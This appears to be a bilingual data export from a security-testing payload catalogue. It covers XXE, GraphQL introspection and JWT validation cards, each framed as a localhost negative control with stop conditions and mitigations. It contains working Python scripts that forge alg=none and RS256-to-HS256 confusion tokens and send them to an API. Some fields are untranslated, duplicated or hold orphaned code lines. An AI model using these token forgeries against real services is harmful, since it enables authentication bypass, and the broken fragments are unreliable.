vulnerability.zh: 风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。
vulnerability.en: 风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。

exploitation.zh: 使用唯一 PAYLOADER_XXE 标记、自有 HTTPS 接收端或 XML 沙箱文件运行单个样例，同时保存原始 XML、解析器配置、应用日志和接收端时间戳。只有实体内容进入输出或对应出站请求被同一事务关联时才确认，DOCTYPE 被接受并不等于实体已展开。
exploitation.en: Run one sample with a unique PAYLOADER_XXE marker, an owned HTTPS receiver, or an XML sandbox file while preserving raw XML, parser configuration, application logs, and receiver timestamps. Confirm only when entity content reaches output or a matching outbound request correlates to the transaction; accepting a DOCTYPE does not prove entity expansion.

mitigation.zh: 在所有 XML、SVG、SOAP 和 OOXML 导入路径禁用 DTD、外部实体与外部资源，使用安全解析器预设并限制出站网络与文件权限。对压缩文档限制大小、部件数量和解压比，并在修复后重放正常文档、DOCTYPE 阴性样例和标记样例。
mitigation.en: Disable DTDs, external entities, and external resources across XML, SVG, SOAP, and OOXML import paths; use secure parser presets and restrict egress plus filesystem permissions. Limit archive size, part count, and expansion ratio, then replay a normal document, a DOCTYPE negative case, and the marker case after remediation.

overview.zh: XXE 到受控 HTTP 夹具验证聚焦以下边界：把外部实体指向受控内部标记服务，验证解析器出站边界而不访问真实内网。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: XXE-to-Controlled-HTTP Fixture Validation focuses on this boundary: Points an external entity to a controlled internal marker service to test parser egress without accessing a real internal network. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。
vulnerability.en: 风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。

exploitation.zh: 使用唯一 PAYLOADER_XXE 标记、自有 HTTPS 接收端或 XML 沙箱文件运行单个样例，同时保存原始 XML、解析器配置、应用日志和接收端时间戳。只有实体内容进入输出或对应出站请求被同一事务关联时才确认，DOCTYPE 被接受并不等于实体已展开。
exploitation.en: Run one sample with a unique PAYLOADER_XXE marker, an owned HTTPS receiver, or an XML sandbox file while preserving raw XML, parser configuration, application logs, and receiver timestamps. Confirm only when entity content reaches output or a matching outbound request correlates to the transaction; accepting a DOCTYPE does not prove entity expansion.

mitigation.zh: 在所有 XML、SVG、SOAP 和 OOXML 导入路径禁用 DTD、外部实体与外部资源，使用安全解析器预设并限制出站网络与文件权限。对压缩文档限制大小、部件数量和解压比，并在修复后重放正常文档、DOCTYPE 阴性样例和标记样例。
mitigation.en: Disable DTDs, external entities, and external resources across XML, SVG, SOAP, and OOXML import paths; use secure parser presets and restrict egress plus filesystem permissions. Limit archive size, part count, and expansion ratio, then replay a normal document, a DOCTYPE negative case, and the marker case after remediation.

overview.zh: DOCX OOXML 解析器 XXE 验证聚焦以下边界：明确检查 word/document.xml 与关系部件，并通过专用无数据 DOCX 夹具验证上传解析器。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: DOCX OOXML Parser XXE Validation focuses on this boundary: Explicitly inspects word/document.xml and relationship parts and tests the upload parser with a dedicated data-free DOCX fixture. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。
vulnerability.en: 风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。

exploitation.zh: 使用唯一 PAYLOADER_XXE 标记、自有 HTTPS 接收端或 XML 沙箱文件运行单个样例，同时保存原始 XML、解析器配置、应用日志和接收端时间戳。只有实体内容进入输出或对应出站请求被同一事务关联时才确认，DOCTYPE 被接受并不等于实体已展开。
exploitation.en: Run one sample with a unique PAYLOADER_XXE marker, an owned HTTPS receiver, or an XML sandbox file while preserving raw XML, parser configuration, application logs, and receiver timestamps. Confirm only when entity content reaches output or a matching outbound request correlates to the transaction; accepting a DOCTYPE does not prove entity expansion.

mitigation.zh: 在所有 XML、SVG、SOAP 和 OOXML 导入路径禁用 DTD、外部实体与外部资源，使用安全解析器预设并限制出站网络与文件权限。对压缩文档限制大小、部件数量和解压比，并在修复后重放正常文档、DOCTYPE 阴性样例和标记样例。
mitigation.en: Disable DTDs, external entities, and external resources across XML, SVG, SOAP, and OOXML import paths; use secure parser presets and restrict egress plus filesystem permissions. Limit archive size, part count, and expansion ratio, then replay a normal document, a DOCTYPE negative case, and the marker case after remediation.

name.zh: GraphQL Schema 暴露边界验证

description.zh: 使用最小只读内省查询验证指定角色是否能够看到 Query 类型名称，并把类型映射、Schema 导出和角色矩阵迁入工具卡。
description.en: Use a minimal read-only introspection query to validate whether a designated role may view the Query type name, moving type maps, schema export, and role matrices into a tool card.

prerequisites.zh: 定义匿名、普通用户和审核者角色的 Schema 可见性策略。
prerequisites.en: Define schema-visibility policy for anonymous, ordinary-user, and reviewer roles.

prerequisites.zh: 使用 localhost GraphQL Fixture，并确保查询只选择 queryType.name。
prerequisites.en: Use a localhost GraphQL fixture and ensure the query selects only query Type.name.

title.zh: 最小 Schema 可见性查询

execution.command: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/graphql" -H "Authorization: Bearer graphql-lab-token" -H "Content-Type: application/json" -H "X-Request-ID: graphql-introspection-boundary-001" --data '{"query":"query SchemaExposure{__schema{queryType{name}}}"}' | jq -e '.data.__schema.queryType.name or .errors'

description.zh: 以固定实验角色只查询 queryType.name，并将 data 或 errors 与登记的可见性策略比较。
description.en: Query only query Type.name as one fixed lab role and compare data or errors with the registered visibility policy.

analysis.zh: 有效发现需要明确的角色可见性策略、非预期 Schema 元数据和可解释的安全价值。最小内省成功、公开类型名、统一错误或审核者按设计导出 Schema 都不是漏洞。
analysis.en: A valid finding requires an explicit role-visibility policy, unexpected schema metadata, and explainable security relevance. Minimal introspection success, public type names, generic errors, or reviewer schema export by design are not vulnerabilities.

opsecTips.zh: Payload 只请求 queryType.name，不下载完整 Schema 或字段说明。
opsecTips.en: The payload requests query Type.name only and does not download a complete schema or field descriptions.

opsecTips.zh: Schema 导出仅由审核者工具保存到本地实验文件，并在比较后删除。
opsecTips.en: Only the reviewer tool may save a schema to a local lab file, which is deleted after comparison.

title.zh: 登记角色可见性策略

description.zh: 记录受测角色应允许或拒绝的最小 Schema 元数据及预期错误。
description.en: Record minimal schema metadata and expected errors allowed or denied for the tested role.

title.zh: 发送最小内省查询

description.zh: 只查询 queryType.name，并保留角色、请求 ID、data 与 errors。
description.en: Query only query Type.name and retain role, request ID, data, and errors.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/graphql" -H "Authorization: Bearer graphql-lab-token" -H "Content-Type: application/json" -H "X-Request-ID: graphql-introspection-boundary-001" --data '{"query":"query SchemaExposure{__schema{queryType{name}}}"}' | jq -e '.data.__schema.queryType.name or .errors'

title.zh: 比较策略与实际结果

description.zh: 判断返回元数据是否超出角色策略，不把内省成功自动记录为漏洞。
description.en: 判断返回元数据是否超出角色策略，不把内省成功自动记录为漏洞。

title.zh: 修复角色策略并回归

description.zh: 统一解析级策略后重放匿名、普通用户和审核者矩阵，确认预期可见性。
description.en: After unified parsed-operation policy, replay anonymous, ordinary-user, and reviewer roles to confirm expected visibility.

overview.zh: GraphQL 内省是规范定义的 Schema 查询能力，不应自动称为攻击。该 Payload 只验证一个角色对最小 Schema 元数据的可见性是否符合策略；完整类型图、导出文件和多角色比较属于工具工作流。
overview.en: GraphQL introspection is a specification-defined schema capability and is not automatically an attack. This payload checks whether one role's access to minimal schema metadata matches policy, while complete type maps, exports, and role comparisons remain a tool workflow.

vulnerability.zh: 如果生产策略要求匿名或普通用户不可见内部 Schema，而服务仍返回类型、弃用说明或管理 Mutation，可能增加攻击面信息。内省开启本身通常只是配置选择，只有违反明确策略并暴露有安全价值的非预期元数据才构成发现。
vulnerability.en: If production policy hides internal schema metadata from anonymous or ordinary users but the service still returns types, deprecation notes, or administrative mutations, the exposure may aid attack-surface discovery. Introspection enabled by itself is usually a configuration choice; a finding requires policy violation and security-relevant unexpected metadata.

exploitation.zh: 分别以一个受测角色发送最小 queryType.name 查询，并记录 HTTP 状态、GraphQL errors、data 和请求 ID。若需进一步确认，只由审核者工具导出受控 Schema 进行差异比较；不尝试格式变体绕过、GET 编码绕过或敏感 Mutation。
exploitation.en: Send the minimal query Type.name request as one tested role and record HTTP status, GraphQL errors, data, and request ID. If further confirmation is needed, use the reviewer tool for a controlled schema diff without formatting bypasses, GET-encoding bypasses, or sensitive mutations.

mitigation.zh: 根据业务需要和角色策略控制内省，在边缘和应用层使用一致的解析结果而不是字符串匹配，并限制错误建议与 Schema 变更日志。即使关闭内省，也必须继续执行 resolver 授权、字段级策略和查询成本限制。
mitigation.en: Control introspection according to business need and role policy using parsed operations rather than string matching at the edge and application. Limit error suggestions and schema-change logs, while continuing resolver authorization, field policy, and query-cost controls even when introspection is disabled.

name.zh: JWT None 与未签名令牌拒绝

prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT None 与未签名令牌拒绝对照 1
title.en: JWT None and Unsigned Token Rejection Control 1

execution.command:
python3 - <<'PY'
import base64, json, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
header = {"alg": "none", "typ": "payloader+jwt"}
claims = {"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60}
print(encode(header) + "." + encode(claims) + ".")
PY
# Expected: generation succeeds locally; every configured verifier rejects the unsigned token.

encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
for subject in ("payloader-user", "payloader-negative"):

execution.command:
python3 - <<'PY'
import base64, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
claims = encode({"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
for algorithm in ("none", "None", "NONE", ""):
    token = encode({"alg": algorithm, "typ": "payloader+jwt"}) + "." + claims + "."
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization": "Bearer " + token})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(repr(algorithm), status)
PY
# Fixed four-case budget; every unsigned or unapproved algorithm is rejected.

analysis.zh: 该审校聚焦JWT 未签名算法拒绝测试集。阳性必须表现为 localhost 验证器在错误算法、错误 key 来源或错误 claim 条件下仍建立了错误主体并读取同一只读标记，同时由验证器日志确认具体分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This review focuses on JWT Unsigned Algorithm Rejection Test Set. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

title.zh: 建立JWT None 与未签名令牌拒绝基线
title.en: Baseline JWT None and Unsigned Token Rejection

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。
description.en: Issue a short-lived valid token from the test issuer and record algorithm, key ID, issuer, audience, type, principal, and marker access.

title.zh: 提交JWT None 与未签名令牌拒绝阴性对照
title.en: Submit the JWT None and Unsigned Token Rejection Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

attackChain.payload:
python3 - <<'PY'
import base64, json, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
header = {"alg": "none", "typ": "payloader+jwt"}
claims = {"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60}
print(encode(header) + "." + encode(claims) + ".")
PY
# Expected: generation succeeds locally; every configured verifier rejects the unsigned token.

title.zh: 确认验证器拒绝分支

description.zh: 关联算法选择、key resolver、claim 校验、HTTP 状态和最终主体，排除仅能生成或解码 token 的假阳性。
description.en: Correlate algorithm selection, key resolver, claim validation, HTTP status, and final principal, excluding token generation or decoding as false positives.

title.zh: 撤销 fixture 并回归

description.zh: 删除本地 token、key、证书和缓存，重放有效基线与全部固定阴性对照。
description.en: Delete local tokens, keys, certificates, and caches, then replay the valid baseline and every fixed negative control.

overview.zh: JWT 未签名算法拒绝测试集必须按 token 类型、算法、key 来源和 claim profile 分别验证；JWT 可被解码是格式属性，不代表签名或授权有效。
overview.en: JWT Unsigned Algorithm Rejection Test Set must be validated separately by token type, algorithm, key source, and claim profile; JWT decodability is a format property and does not imply valid signatures or authorization.

vulnerability.zh: 根因通常是验证器相信 token 自带的 alg、jwk、jku、x5u、x5c 或 kid，混用 HMAC 与非对称 key，使用低熵 HMAC key，或遗漏 issuer、audience、时间和 token type 校验。
vulnerability.en: Root causes include trusting token-supplied alg, jwk, jku, x5u, x5c, or kid values, mixing HMAC and asymmetric keys, using low-entropy HMAC keys, or omitting issuer, audience, time, and token-type validation.

exploitation.zh: 先用本地测试 issuer 生成短期有效 token 并访问只读标记，再一次只改变一个算法、key 引用或 claim。验证器必须显式固定允许算法和 key，并记录 issuer、audience、type 与时间检查结果。
exploitation.en: Generate a short-lived valid token from the local test issuer and access the read-only marker, then change exactly one algorithm, key reference, or claim. The verifier must explicitly pin algorithms and keys and log issuer, audience, type, and time checks.

mitigation.zh: 按 token 类型使用互斥验证规则，固定算法与 key 类型，使用高熵 HMAC key；只从 issuer 配置的受信来源解析 key，允许列表化 kid 与 jku/x5u，并严格校验 iss、aud、exp、nbf 和 typ。
mitigation.en: Use mutually exclusive validation rules per token type, pin algorithms and key types, and use high-entropy HMAC keys; resolve keys only from issuer-configured trusted sources, allowlist kid and jku/x5u, and strictly validate iss, aud, exp, nbf, and typ.

name.zh: JWT 算法与 Key 类型绑定

description.zh: 使用临时本地 RSA public key 构造历史 RS256 到 HS256 混淆对照，确认验证器固定算法且不把 public key 当 HMAC secret。
description.en: Builds a historical RS256-to-HS256 confusion control from a temporary local RSA public key and confirms that the verifier pins algorithms and never treats the public key as an HMAC secret.

subCategory.zh: JWT 算法与 Key 类型绑定

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: 仅使用本地生成令牌、固定测试 HMAC key 或临时 RSA/X.509 fixture；不得读取生产 token/key、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT 算法与 Key 类型绑定对照 1
title.en: JWT Algorithm and Key-Type Binding Control 1

execution.command:
work_dir="$(mktemp -d)"
trap 'rm -rf "$work_dir"' EXIT
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$work_dir/test-private.pem"
openssl pkey -in "$work_dir/test-private.pem" -pubout -out "$work_dir/test-public.pem"
python3 - "$work_dir/test-public.pem" <<'PY'
import base64, hashlib, hmac, json, sys, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
public_key = open(sys.argv[1], "rb").read()
header = encode({"alg": "HS256", "typ": "payloader+jwt", "kid": "PAYLOADER_RSA_TEST_KEY"})
claims = encode({"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
signature = base64.urlsafe_b64encode(hmac.new(public_key, (header + "." + claims).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
print(header + "." + claims + "." + signature)
PY
# This historical confusion token is generated only from a temporary local public key; a modern verifier rejects it.

title.zh: JWT KID 允许列表与查找边界对照 1
title.en: JWT KID Allowlist and Lookup Boundary Control 1

execution.command:
python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
kids = ("PAYLOADER_TEST_KEY", "PAYLOADER_UNKNOWN_KEY", "PAYLOADER_DISABLED_KEY", "PAYLOADER_KEY_" + "X" * 80)
for kid in kids:
    header = encode({"alg": "HS256", "typ": "payloader+jwt", "kid": kid})
    claims = encode({"sub": "payloader-user", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
    signature = base64.urlsafe_b64encode(hmac.new(secret, (header + "." + claims).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization": "Bearer " + header + "." + claims + "." + signature})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(kid[:32], status)
PY
# Only the configured opaque key ID may reach signature verification; unknown, disabled, and overlong identifiers are rejected.
